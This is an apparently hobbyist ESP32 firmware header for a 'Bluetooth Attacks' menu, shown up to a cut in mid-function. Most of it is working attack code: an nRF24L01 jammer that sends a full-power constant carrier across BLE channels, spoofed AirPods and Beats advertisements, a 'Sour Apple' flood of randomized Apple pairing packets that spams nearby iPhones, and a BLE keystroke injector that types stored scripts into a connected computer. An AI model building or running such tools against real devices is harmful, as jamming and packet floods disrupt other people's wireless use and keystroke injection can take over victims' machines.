#ifndef BLUETOOTH_MENU_H
#define BLUETOOTH_MENU_H

#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEAdvertisedDevice.h>
#include <BLEScan.h>
#include <BleKeyboard.h>
#include <RF24.h>
#include <SPI.h>
#include <SD.h>
#include <FS.h>

// External references (defined in main.ino)
extern TFT_eSPI tft;
extern bool readButtonOnce(int pin);
extern void drawStatusBarBright();
extern void drawRoundedIcon(int x, int y, int w, int h, const uint16_t* icon, int radius);
extern bool feature_exit_requested;
extern bool feature_active;
extern int btSelected;   // Bluetooth menu selection

// Colors (must match main)
#ifndef BG
#define BG        0x0000
#define TILE      0x2104
#define BORDER    0x39C7
#define SELECT    0xFD20
#define GREEN     0x07E0
#define WHITE     0xFFFF
#define RED       0xF800
#define YELLOW    0xFFE0
#endif

// ==================== FORWARD DECLARATIONS ====================
void runBleJammer();
void runBleSpoofer();
void runSourApple();
void runSniffer();
void runBleScanner();
void runRubberDucky();

// ======================= ICON ARRAYS =======================
// Paste your own 32x32 RGB565 icon data inside the braces.
const uint16_t icon_ble_jammer[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff

};   // <-- REPLACE
const uint16_t icon_ble_spoofer[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xf79e, 0xd6ba, 0xffdf, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};  // <-- REPLACE
const uint16_t icon_sour_apple[] PROGMEM = {0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
0x0000, 0x0000, 0x0000, 0xffff, 0x652c, 0x4d29, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
0x0000, 0x0000, 0x75ae, 0x0380, 0x0280, 0x1c63, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
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0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000};   // <-- REPLACE
const uint16_t icon_sniffer[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xf79e, 0x2124, 0x52aa, 0x94b2, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0x7bef, 0x0000, 0x0020, 0x2965, 0x0861, 0x73ae, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xef5d, 0x4228, 0xe73c, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0x2945, 0x2945, 0x2945, 0x2945, 0x2945, 0x2965, 0xe71c, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff
};      // <-- REPLACE
const uint16_t icon_ble_scanner[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff
};  // <-- REPLACE
const uint16_t icon_rubber_ducky[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xff77, 0xfeef, 0xfe8b, 0xfe47, 0xfe8a, 0xfece, 0xff55, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xfffe, 0xffff, 0xffff, 0xffff, 0xffbc, 0xfe8a, 
0xfe02, 0xfe02, 0xfe25, 0xfe68, 0xfe46, 0xfe02, 0xfe02, 0xfe47, 0xff56, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0x41a2, 0x41a3, 0x41c4, 0x41e6, 0x4208, 0x3a2b, 0x31ca, 0x31c9, 0x3187, 0x3186, 0x3186, 0x3186, 0x31a6, 0x3186, 0x3186, 0x4228}; // <-- REPLACE
const uint16_t icon_back_bt[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff
};      // <-- REPLACE

// ======================= MENU ITEMS =======================
const char* btAttacks[] = {
  "BLE Jammer",
  "BLE Spoofer",
  "Sour Apple",
  "Sniffer",
  "BLE Scanner",
  "BLE Rubber Ducky",
  "Back to Main Menu"
};
#define BT_ATTACK_COUNT 7

// ======================= DRAW MENU =======================
void drawBluetoothMenu() {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(WHITE, BG);
  tft.setTextSize(1);
  tft.setCursor(10, 35);
  tft.print("Bluetooth Attacks");

  for (int i = 0; i < BT_ATTACK_COUNT; i++) {
    int y = 55 + i * 36;
    if (i == BT_ATTACK_COUNT - 1) y += 5;
    uint16_t color = (i == btSelected) ? SELECT : GREEN;
    tft.setTextColor(color, BG);
    int iconX = 10;
    int iconY = y - 12;
    const uint16_t* iconPtr = nullptr;
    switch (i) {
      case 0: iconPtr = icon_ble_jammer; break;
      case 1: iconPtr = icon_ble_spoofer; break;
      case 2: iconPtr = icon_sour_apple; break;
      case 3: iconPtr = icon_sniffer; break;
      case 4: iconPtr = icon_ble_scanner; break;
      case 5: iconPtr = icon_rubber_ducky; break;
      case 6: iconPtr = icon_back_bt; break;
    }
    drawRoundedIcon(iconX, iconY, 32, 32, iconPtr, 6);
    tft.setCursor(50, y);
    tft.print(btAttacks[i]);
  }
}

bool handleBluetoothMenu() {
  int old = btSelected;
  bool redraw = false;

  if (readButtonOnce(BTN_UP)) {
    btSelected = (btSelected - 1 + BT_ATTACK_COUNT) % BT_ATTACK_COUNT;
    redraw = true;
  }
  else if (readButtonOnce(BTN_DOWN)) {
    btSelected = (btSelected + 1) % BT_ATTACK_COUNT;
    redraw = true;
  }
  else if (readButtonOnce(BTN_OK)) {
    if (btSelected == BT_ATTACK_COUNT - 1) return true;
    feature_active = true;
    feature_exit_requested = false;
    switch (btSelected) {
      case 0: runBleJammer(); break;
      case 1: runBleSpoofer(); break;
      case 2: runSourApple(); break;
      case 3: runSniffer(); break;
      case 4: runBleScanner(); break;
      case 5: runRubberDucky(); break;
    }
    feature_active = false;
    drawBluetoothMenu();
    redraw = false;
  }

  if (redraw) {
    int oldY = 55 + old * 36 + (old == BT_ATTACK_COUNT - 1 ? 5 : 0);
    int newY = 55 + btSelected * 36 + (btSelected == BT_ATTACK_COUNT - 1 ? 5 : 0);
    tft.fillRect(50, oldY - 8, 150, 20, BG);
    tft.setTextColor(GREEN, BG);
    tft.setCursor(50, oldY);
    tft.print(btAttacks[old]);
    tft.fillRect(50, newY - 8, 150, 20, BG);
    tft.setTextColor(SELECT, BG);
    tft.setCursor(50, newY);
    tft.print(btAttacks[btSelected]);
  }
  return false;
}

// ======================= ATTACK IMPLEMENTATIONS =======================

// ----- NRF24L01 for Jammer -----
#define NRF_CE_PIN   4
#define NRF_CSN_PIN  3
RF24 radio(NRF_CE_PIN, NRF_CSN_PIN, 16000000);
bool nrfPresent = false;

void checkNRF() {
  nrfPresent = radio.begin();
  if (!nrfPresent) {
    tft.fillRect(10, 115, 220, 40, BG);
    tft.setTextColor(RED, BG);
    tft.setCursor(10, 115);
    tft.print("NRF24L01 NOT DETECTED!");
    tft.setCursor(10, 135);
    tft.print("Check wiring.");
    delay(2000);
  } else {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
  }
}

void runBleJammer() {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("BLE Jammer");
  tft.setCursor(10, 55);
  tft.print("Press OK to start/stop");
  tft.setCursor(10, 75);
  tft.print("Press LEFT to exit");

  checkNRF();
  if (!nrfPresent) {
    while (!readButtonOnce(BTN_LEFT)) delay(50);
    return;
  }

  bool active = false;
  const int jamChannels[] = {2, 26, 80, 37, 38, 39};
  int jamCount = sizeof(jamChannels)/sizeof(jamChannels[0]);

  while (!feature_exit_requested) {
    if (readButtonOnce(BTN_OK)) {
      active = !active;
      if (active) {
        tft.fillRect(10, 95, 220, 20, BG);
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 95);
        tft.print(">>> JAMMING ACTIVE <<<");
        radio.startConstCarrier(RF24_PA_MAX, jamChannels[0]);
      } else {
        radio.stopConstCarrier();
        tft.fillRect(10, 95, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_LEFT)) break;

    if (active) {
      static int chIdx = 0;
      radio.stopConstCarrier();
      radio.startConstCarrier(RF24_PA_MAX, jamChannels[chIdx]);
      chIdx = (chIdx + 1) % jamCount;
      delay(20);
    }
    delay(50);
  }
  radio.stopConstCarrier();
  radio.powerDown();
  feature_exit_requested = false;
}

// ----- 2. BLE Spoofer -----
const uint8_t DEVICES[17][31] = {
  // Fill with your 17 advertisement packets (example first one)
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  // ... add the other 16 ...
};
const char* deviceNames[] = {
  "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
  "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
  "Beats Studio Buds", "Beats Flex", "Beats X", "Beats Solo 3",
  "Beats Studio 3", "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds Plus"
};
const int numDevices = 17;

void runBleSpoofer() {
  BLEDevice::deinit(); delay(100);
  BLEDevice::init("ESP32");
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("BLE Spoofer");
  tft.setCursor(10, 55);
  tft.print("UP/DOWN: change device");
  tft.setCursor(10, 75);
  tft.print("OK: start/stop");
  tft.setCursor(10, 95);
  tft.print("LEFT: exit");

  bool spoofing = false;
  int spoofIndex = 0;
  unsigned long spoofPackets = 0;

  while (!feature_exit_requested) {
    if (readButtonOnce(BTN_UP)) {
      spoofIndex = (spoofIndex - 1 + numDevices) % numDevices;
      tft.fillRect(10, 115, 220, 20, BG);
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 115);
      tft.printf("Device: %s", deviceNames[spoofIndex]);
      if (spoofing) {
        BLEAdvertisementData adv;
        adv.addData((char*)DEVICES[spoofIndex], 31);
        pAdvertising->setAdvertisementData(adv);
        pAdvertising->start();
      }
      delay(200);
    }
    if (readButtonOnce(BTN_DOWN)) {
      spoofIndex = (spoofIndex + 1) % numDevices;
      tft.fillRect(10, 115, 220, 20, BG);
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 115);
      tft.printf("Device: %s", deviceNames[spoofIndex]);
      if (spoofing) {
        BLEAdvertisementData adv;
        adv.addData((char*)DEVICES[spoofIndex], 31);
        pAdvertising->setAdvertisementData(adv);
        pAdvertising->start();
      }
      delay(200);
    }
    if (readButtonOnce(BTN_OK)) {
      spoofing = !spoofing;
      if (spoofing) {
        BLEAdvertisementData adv;
        adv.addData((char*)DEVICES[spoofIndex], 31);
        pAdvertising->setAdvertisementData(adv);
        pAdvertising->start();
        tft.fillRect(10, 135, 220, 20, BG);
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 135);
        tft.print(">>> SPOOFING ACTIVE <<<");
      } else {
        pAdvertising->stop();
        tft.fillRect(10, 135, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_LEFT)) break;

    if (spoofing) {
      spoofPackets++;
      tft.fillRect(10, 155, 220, 20, BG);
      tft.setTextColor(YELLOW, BG);
      tft.setCursor(10, 155);
      tft.printf("Packets sent: %lu", spoofPackets);
    }
    delay(100);
  }

  if (pAdvertising) pAdvertising->stop();
  BLEDevice::deinit();
  feature_exit_requested = false;
}

// ----- 3. Sour Apple -----
void runSourApple() {
  BLEDevice::deinit(); delay(100);
  BLEDevice::init("SourApple");
  BLEAdvertising* sourAdv = BLEDevice::getAdvertising();

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Sour Apple Attack");
  tft.setCursor(10, 55);
  tft.print("OK: start/stop");
  tft.setCursor(10, 75);
  tft.print("LEFT: exit");

  bool active = false;
  int sourPackets = 0;
  uint8_t sourPacketData[17];

  auto makePacket = [&]() {
    uint8_t i=0;
    sourPacketData[i++]=16; sourPacketData[i++]=0xFF; sourPacketData[i++]=0x4C; sourPacketData[i++]=0x00;
    sourPacketData[i++]=0x0F; sourPacketData[i++]=0x05; sourPacketData[i++]=0xC1;
    const uint8_t types[]={0x27,0x09,0x02,0x1e,0x2b,0x2d,0x2f,0x01,0x06,0x20,0xc0};
    sourPacketData[i++]=types[random(0,sizeof(types))];
    esp_fill_random(&sourPacketData[i],3); i+=3;
    sourPacketData[i++]=0x00; sourPacketData[i++]=0x00; sourPacketData[i++]=0x10;
    esp_fill_random(&sourPacketData[i],3);
  };

  while (!feature_exit_requested) {
    if (readButtonOnce(BTN_OK)) {
      active = !active;
      if (active) {
        tft.fillRect(10, 95, 220, 20, BG);
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 95);
        tft.print(">>> ATTACK ACTIVE <<<");
      } else {
        sourAdv->stop();
        tft.fillRect(10, 95, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_LEFT)) break;

    if (active) {
      makePacket();
      BLEAdvertisementData adv;
      adv.addData((char*)sourPacketData, 17);
      sourAdv->setAdvertisementData(adv);
      sourAdv->start();
      delay(30);
      sourAdv->stop();
      sourPackets++;
      tft.fillRect(10, 115, 220, 20, BG);
      tft.setTextColor(YELLOW, BG);
      tft.setCursor(10, 115);
      tft.printf("Packets sent: %d", sourPackets);
    }
    delay(10);
  }

  if (sourAdv) sourAdv->stop();
  BLEDevice::deinit();
  feature_exit_requested = false;
}

// ----- 4. Sniffer -----
BLEScan* pScan = nullptr;
std::vector<BLEAdvertisedDevice> lastDevices;
bool sniffing = false;

void updateSnifferDisplay() {
  tft.fillRect(10, 95, 220, 200, BG);
  tft.setTextColor(WHITE, BG);
  tft.setCursor(10, 95);
  tft.printf("Devices: %d", (int)lastDevices.size());
  int y = 115;
  for (size_t i = 0; i < lastDevices.size() && i < 10; i++) {
    tft.setCursor(10, y);
    tft.printf("%s (%d dBm)", lastDevices[i].getName().c_str(), lastDevices[i].getRSSI());
    y += 20;
  }
}

void scanCompleteCallback(BLEScanResults results) {
  lastDevices.clear();
  for (int i = 0; i < results.getCount(); i++) {
    lastDevices.push_back(results.getDevice(i));
  }
  updateSnifferDisplay();
  if (sniffing && pScan) {
    pScan->start(5, scanCompleteCallback, false);
  }
}

void runSniffer() {
  BLEDevice::deinit(); delay(100);
  BLEDevice::init("");
  pScan = BLEDevice::getScan();
  pScan->setActiveScan(true);
  sniffing = false;
  lastDevices.clear();

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("BLE Sniffer");
  tft.setCursor(10, 55);
  tft.print("OK: start/stop");
  tft.setCursor(10, 75);
  tft.print("LEFT: exit");

  while (!feature_exit_requested) {
    if (readButtonOnce(BTN_OK)) {
      sniffing = !sniffing;
      if (sniffing) {
        pScan->start(5, scanCompleteCallback, false);
        tft.fillRect(10, 95, 220, 20, BG);
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 95);
        tft.print(">>> SCANNING <<<");
      } else {
        pScan->stop();
        tft.fillRect(10, 95, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_LEFT)) break;
    delay(50);
  }

  if (pScan) pScan->stop();
  BLEDevice::deinit();
  feature_exit_requested = false;
}

// ----- 5. BLE Scanner (one‑time) -----
void runBleScanner() {
  BLEDevice::deinit(); delay(100);
  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true);

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("BLE Scanner");
  tft.setCursor(10, 55);
  tft.print("Scanning for 5 seconds...");

  scan->start(5, false);
  BLEScanResults results = *scan->getResults();
  int count = results.getCount();

  tft.fillRect(10, 75, 220, 200, BG);
  tft.setTextColor(WHITE, BG);
  tft.setCursor(10, 75);
  tft.printf("Found %d devices", count);
  int y = 95;
  for (int i = 0; i < count && i < 12; i++) {
    BLEAdvertisedDevice dev = results.getDevice(i);
    tft.setCursor(10, y);
    tft.printf("%s (%d dBm)", dev.getName().c_str(), dev.getRSSI());
    y += 20;
  }
  tft.setCursor(10, y+10);
  tft.print("Press OK to return");
  while (!readButtonOnce(BTN_OK)) delay(50);

  BLEDevice::deinit();
  feature_exit_requested = false;
}

// ----- 6. BLE Rubber Ducky (SD card) -----
#define SD_CS_PIN   10
#define SD_MOSI_PIN 11
#define SD_MISO_PIN 6
#define SD_SCK_PIN  18
SPIClass sdSPI(FSPI);

void initSD() {
  sdSPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
  if (!SD.begin(SD_CS_PIN, sdSPI)) {
    Serial.println("SD card init failed");
  }
}

String onScreenKeyboard(String prompt);
void listScripts();

void runRubberDucky() {
  BLEDevice::deinit(); delay(100);  // ensure clean BLE state

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("BLE Rubber Ducky");
  tft.setCursor(10, 55);
  tft.print("1: Create new script");
  tft.setCursor(10, 75);
  tft.print("2: Load & execute script");
  tft.setCursor(10, 95);
  tft.print("Press OK to select");

  int choice = 1;
  while (!feature_exit_requested) {
    if (readButtonOnce(BTN_UP)) {
      choice = 1;
      tft.fillRect(10, 55, 220, 60, BG);
      tft.setCursor(10, 55);
      tft.print("1: Create new script");
      tft.setCursor(10, 75);
      tft.print("2: Load & execute script");
      delay(200);
    }
    if (readButtonOnce(BTN_DOWN)) {
      choice = 2;
      tft.fillRect(10, 55, 220, 60, BG);
      tft.setCursor(10, 55);
      tft.print("1: Create new script");
      tft.setCursor(10, 75);
      tft.print("2: Load & execute script");
      delay(200);
    }
    if (readButtonOnce(BTN_OK)) {
      if (choice == 1) {
        String script = onScreenKeyboard("Enter script text:");
        if (script.length() > 0) {
          initSD();
          if (!SD.begin(SD_CS_PIN, sdSPI)) {
            tft.fillRect(10, 120, 220, 20, BG);
            tft.setTextColor(RED, BG);
            tft.setCursor(10, 120);
            tft.print("SD card error!");
            delay(1000);
            break;
          }
          if (!SD.exists("/ducky")) SD.mkdir("/ducky");
          String filename = "/ducky/script_" + String(millis()) + ".txt";
          File f = SD.open(filename, FILE_WRITE);
          if (f) {
            f.print(script);
            f.close();
            tft.fillRect(10, 120, 220, 20, BG);
            tft.setTextColor(GREEN, BG);
            tft.setCursor(10, 120);
            tft.print("Saved: " + filename);
            delay(1500);
          } else {
            tft.fillRect(10, 120, 220, 20, BG);
            tft.setTextColor(RED, BG);
            tft.setCursor(10, 120);
            tft.print("Save failed!");
            delay(1000);
          }
        }
      } else {
        listScripts();
      }
      break;
    }
    if (readButtonOnce(BTN_LEFT)) break;
    delay(50);
  }
  feature_exit_requested = false;
}

// Helper: list scripts on SD
void listScripts() {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(WHITE, BG);
  tft.setCursor(10, 35);
  tft.print("Saved Scripts");

  initSD();
  if (!SD.begin(SD_CS_PIN, sdSPI)) {
    tft.setCursor(10, 55);
    tft.setTextColor(RED, BG);
    tft.print("SD Card not found!");
    delay(2000);
    return;
  }
  if (!SD.exists("/ducky")) SD.mkdir("/ducky");
  File dir = SD.open("/ducky");
  std::vector<String> files;
  while (true) {
    File entry = dir.openNextFile();
    if (!entry) break;
    if (!entry.isDirectory()) {
      String name = entry.name();
      if (name.endsWith(".txt")) files.push_back(name);
    }
    entry.close();
  }
  dir.close();

  if (files.size() == 0) {
    tft.setCursor(10, 55);
    tft.setTextColor(YELLOW, BG);
    tft.print("No scripts found.");
    tft.setCursor(10, 75);
    tft.print("Create one with keyboard.");
    delay(2000);
    return;
  }

  int idx = 0;
  while (true) {
    tft.fillRect(10, 55, 220, 200, BG);
    tft.setTextColor(WHITE, BG);
    for (size_t i = 0; i < files.size() && i < 10; i++) {
      int y = 65 + i * 20;
      tft.setTextColor((i == idx) ? SELECT : GREEN, BG);
      tft.setCursor(20, y);
      tft.print(files[i]);
    }
    if (readButtonOnce(BTN_UP)) { idx = (idx - 1 + files.size()) % files.size(); delay(150); }
    if (readButtonOnce(BTN_DOWN)) { idx = (idx + 1) % files.size(); delay(150); }
    if (readButtonOnce(BTN_OK)) {
      String selectedScript = files[idx];
      tft.fillRect(0, 23, 240, 297, BG);
      drawStatusBarBright();
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 35);
      tft.print("Script: " + selectedScript);
      File f = SD.open("/ducky/" + selectedScript);
      String content = f.readString();
      f.close();
      tft.setCursor(10, 55);
      tft.print("Size: " + String(content.length()) + " bytes");
      tft.setCursor(10, 75);
      tft.print("Press OK to execute");
      tft.setCursor(10, 95);
      tft.print("Press RIGHT to delete");
      tft.setCursor(10, 115);
      tft.print("Press LEFT to return");

      while (true) {
        if (readButtonOnce(BTN_OK)) {
          BleKeyboard bleKeyboard;
          bleKeyboard.begin();
          tft.fillRect(10, 135, 220, 20, BG);
          tft.setTextColor(YELLOW, BG);
          tft.setCursor(10, 135);
          tft.print("Waiting for BLE connection...");
          while (!bleKeyboard.isConnected()) delay(100);
          bleKeyboard.print(content);
          bleKeyboard.end();
          tft.fillRect(10, 135, 220, 20, BG);
          tft.setTextColor(GREEN, BG);
          tft.setCursor(10, 135);
          tft.print("Executed!");
          delay(1500);
          break;
        }
        if (readButtonOnce(BTN_RIGHT)) {
          SD.remove("/ducky/" + selectedScript);
          tft.setCursor(10, 135);
          tft.setTextColor(RED, BG);
          tft.print("Deleted!");
          delay(1000);
          break;
        }
        if (readButtonOnce(BTN_LEFT)) break;
        delay(50);
      }
      break;
    }
    if (readButtonOnce(BTN_LEFT)) break;
    delay(50);
  }
}

// ----- On‑screen keyboard -----
String onScreenKeyboard(String prompt) {
  const char* rows[] = {
    "ABCDEFGHIJKLM",
    "NOPQRSTUVWXYZ",
    "abcdefghijklm",
    "nopqrstuvwxyz",
    "0123456789",
    "!@#$%^&*()",
    "-_=+[]{}|;:'",
    ",.<>/?`~",
    "BACKSPACE",
    "DONE"
  };
  int rowCount = 10;
  int keyW = 15;
  int keyH = 18;
  int startX = 5;
  int startY = 80;
  int spacing = 1;
  String input = "";
  int selRow = 0, selCol = 0;

  auto draw = [&]() {
    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(WHITE, BG);
    tft.setCursor(10, 40);
    tft.print(prompt);
    tft.fillRect(10, 55, 220, 25, TILE);
    tft.drawRect(10, 55, 220, 25, BORDER);
    tft.setTextColor(WHITE, TILE);
    tft.setCursor(15, 62);
    tft.print(input);
    for (int r = 0; r < rowCount; r++) {
      int y = startY + r * (keyH + spacing);
      int x = startX;
      const char* keys = rows[r];
      int len = strlen(keys);
      for (int c = 0; c < len; c++) {
        uint16_t bg = (r == selRow && c == selCol) ? SELECT : TILE;
        uint16_t txt = (r == selRow && c == selCol) ? BG : WHITE;
        tft.fillRect(x, y, keyW, keyH, bg);
        tft.drawRect(x, y, keyW, keyH, BORDER);
        tft.setTextColor(txt, bg);
        tft.setCursor(x + 3, y + 4);
        tft.print(keys[c]);
        x += keyW + spacing;
      }
    }
    tft.fillRect(10, 260, 100, 30, TILE);
    tft.drawRect(10, 260, 100, 30, BORDER);
    tft.setTextColor(WHITE, TILE);
    tft.setCursor(40, 270);
    tft.print("SAVE");
    tft.fillRect(130, 260, 100, 30, TILE);
    tft.drawRect(130, 260, 100, 30, BORDER);
    tft.setCursor(155, 270);
    tft.print("CANCEL");
  };

  draw();
  while (true) {
    if (readButtonOnce(BTN_UP)) {
      selRow = (selRow - 1 + rowCount) % rowCount;
      selCol = 0;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_DOWN)) {
      selRow = (selRow + 1) % rowCount;
      selCol = 0;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_LEFT)) {
      int len = strlen(rows[selRow]);
      if (len > 0) selCol = (selCol - 1 + len) % len;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_RIGHT)) {
      int len = strlen(rows[selRow]);
      if (len > 0) selCol = (selCol + 1) % len;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_OK)) {
      const char* keys = rows[selRow];
      if (selRow == rowCount - 2) {
        if (input.length() > 0) input.remove(input.length() - 1);
      } else if (selRow == rowCount - 1) {
        if (input.length() == 0) {
          tft.fillRect(10, 300, 220, 20, BG);
          tft.setTextColor(RED, BG);
          tft.setCursor(10, 300);
          tft.print("Cannot save empty script!");
          delay(1000);
          draw();
          continue;
        }
        return input;
      } else {
        char c = keys[selCol];
        if (input.length() < 200) input += c;
